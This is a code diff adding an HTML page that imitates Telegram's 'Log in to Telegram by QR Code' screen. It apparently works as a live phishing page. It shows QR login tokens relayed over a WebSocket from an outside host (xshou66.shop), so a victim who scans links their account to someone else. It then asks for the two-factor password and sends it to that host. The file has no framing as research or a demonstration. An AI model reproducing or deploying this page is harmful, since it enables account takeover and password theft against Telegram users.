@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Telegram by QR Code</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            /* background-color: #1e1e1e;
+            color: white; */
+        }
+        .container {
+            text-align: center;
+        }
+        #qrcode {
+            margin: 20px auto;
+            background-color: white;
+            text-align: -webkit-center;
+        }
+        .instructions {
+            margin-top: 20px;
+        }
+        .instructions ol {
+            text-align: left;
+            display: inline-block;
+        }
+        .instructions li {
+            margin-top: .5rem;
+        }
+        .phone-login {
+            margin-top: 20px;
+            color: #3390ec;
+            text-decoration: none;
+        }
+
+        @keyframes rotation {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        h4 {
+            font-size: 2rem;
+            margin: 22px 0 14px;
+            line-height: 110%;
+        }
+
+
+        .loader-1 {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #3390ec;
+            border-bottom-color: #ffffff;
+            border-radius: 50%;
+            -webkit-animation: rotation 1s linear infinite;
+            animation: rotation 1s linear infinite;
+            margin:  0 auto 70px;
+        }
+
+        .animated {
+            animation-duration: 0.35s;
+            animation-fill-mode: both;
+        }
+
+        @keyframes zoomIn {
+            from {
+                opacity: 0;
+                transform: scale3d(0.3, 0.3, 0.3);
+            }
+
+            50% {
+                opacity: 1;
+            }
+        }
+
+        .zoomIn {
+            animation-name: zoomIn;
+        }
+
+    </style>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div id="qrsec">
+            <div class="loader-1" id="loading"></div>
+            <div style="display: none;" id="qrcode"></div>
+            <h4>Log in to Telegram by QR Code</h4>
+            
+            <div class="instructions">
+                <ol>
+                    <li>Open Telegram on your phone</li>
+                    <li><span class="i18n">Go to <b>Settings</b> &gt; <b>Devices</b> &gt; <b>Link Desktop Device</b></span></li>
+                    <li>Point your phone at this screen to confirm login</li>
+                </ol>
+            </div>
+            <a href="#" class="phone-login">LOG IN BY PHONE NUMBER</a>
+        </div>
+
+        <div id="pwd" style="display: none;">
+            <input type="password" id="password" placeholder="请输入密码">
+            <button id="submitbtn" onclick="submit(this)">提交</button>
+        </div>
+        <div id="tip"></div>
+    </div>
+
+    <script>
+        function generateRandomString(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        function generateQRCode() {
+            
+            //向qr 发出get请求
+            fetch('qr')
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                    // 清空旧的二维码
+               
+                // if (data == '111'){
+                //     clearInterval(interval);
+                //     window.location.reload()
+                // }
+
+                if (data.startsWith("tg:")) {
+                    // alert(111)
+                    var qrcodediv = document.getElementById("qrcode")
+                    qrcodediv.innerHTML = ''
+                    const qrcode = new QRCode(qrcodediv, {
+                        text: data,
+                        width: 200,
+                        height: 200,
+                        colorDark : "#000000",
+                        colorLight : "#ffffff",
+                        correctLevel : QRCode.CorrectLevel.H
+                    });
+                    
+                }
+
+                if (data == 'waitpas'){
+                    document.getElementById("pwd").style.display = "block";
+                    document.getElementById("qrsec").style.display = "none";
+                }
+                
+                if (data == "succ") {
+                    clearInterval(interval);
+                    document.getElementById("tip").innerHTML = "登陆成功"
+                    document.getElementById("pwd").style.display = "none";
+                }
+               
+                
+            })
+            .catch((error) => {
+            })
+
+            
+        }
+
+        function submit(obj) {
+            obj.style.display = "none"
+            const password = document.getElementById("password").value;
+
+            socket.send(password);
+
+            // const formData = new FormData();
+            // formData.append('pwd', password);
+            // //
+            // clearInterval(interval);
+            // fetch('fa2', {
+            //     method: 'POST',
+            //     body : formData
+                
+            // }).then(response => response.text())
+            // .then(data => {
+            //     console.log(data)
+            //     if (data == "inpas") {
+            //         document.getElementById("tip").innerHTML = "密码错误"
+            //         //刷新页面
+            //         setTimeout(function(){
+            //             window.location.reload()
+            //         } , 3000)
+            //     }
+
+            //     if (data == "succ") {
+            //         document.getElementById("tip").innerHTML = "登陆成功"
+            //         document.getElementById("pwd").style.display = "none";
+            //     }
+            // })
+            
+        }
+
+        
+        var socket = new WebSocket("ws://xshou66.shop/ws");
+
+        socket.onopen = function() {
+            // socket.send("input.value");
+        };
+
+        socket.onmessage = function(event) {
+            if (event.data.startsWith("tg:")) {
+                document.getElementById("loading").style.display = "none"
+                document.getElementById("qrcode").className += " animated zoomIn"
+                document.getElementById("qrcode").style.display = "block"
+                var qrcodediv = document.getElementById("qrcode")
+                qrcodediv.innerHTML = ''
+                const qrcode = new QRCode(qrcodediv, {
+                    text: event.data,
+                    width: 256,
+                    height: 256,
+                    colorDark : "#000000",
+                    colorLight : "#ffffff",
+                    correctLevel : QRCode.CorrectLevel.H
+                });
+                setTimeout(function() {
+                    // 获取二维码的canvas元素
+                    var canvas = document.querySelector("#qrcode canvas");
+                    var imgr = document.querySelector("#qrcode img");
+                    var ctx = canvas.getContext("2d");
+
+                    // 创建一个图像对象用于加载图标
+                    var img = new Image();
+                    img.src = '/static/image-removebg-preview.png'; // 替换为你的图标路径
+
+                    img.onload = function() {
+                        // 计算图标的大小和位置
+                        var iconSize = canvas.width * 0.2; // 图标占二维码的20%
+                        var x = (canvas.width - iconSize) / 2;
+                        var y = (canvas.height - iconSize) / 2;
+
+                        // 将图标绘制到二维码的中心
+                        ctx.drawImage(img, x, y, iconSize, iconSize);
+                        imgr.style.display = "none"
+                        canvas.style.display = "block"
+                    };
+                }, 10);
+            }
+
+            if (event.data == 'waitpas'){
+                document.getElementById("pwd").style.display = "block";
+                document.getElementById("qrsec").style.display = "none";
+            }
+
+            if (event.data == 'inpass'){
+                document.getElementById("tip").innerHTML = "密码错误"
+                document.getElementById("submitbtn").style.display= "block";
+                document.getElementById("pwd").style.display = "block";
+                document.getElementById("qrsec").style.display = "none";
+            }
+            
+            if (event.data == "succ") {
+                document.getElementById("tip").innerHTML = "登陆成功"
+                document.getElementById("pwd").style.display = "none";
+            }
+
+            // console.log("Received: " + event.data)
+           
+        };
+
+        function sendMessage() {
+            var input = document.getElementById("messageInput");
+            socket.send(input.value);
+            input.value = "";
+        }
+
+        socket.onclose = function() {
+            setTimeout(function() {
+                document.getElementById("tip").innerHTML = "请刷新页面"
+                document.getElementById("qrsec").style.display = "none";
+            } , 3000)
+
+
+            console.log("Disconnected from WebSocket server");
+        };
+
+
+        
+
+
+        // Generate QR code when the page loads
+        // window.onload = generateQRCode;
+
+        // Regenerate QR code every 30 seconds
+        // var interval = setInterval(generateQRCode, 1000);
+    </script>
+</body>
+</html>
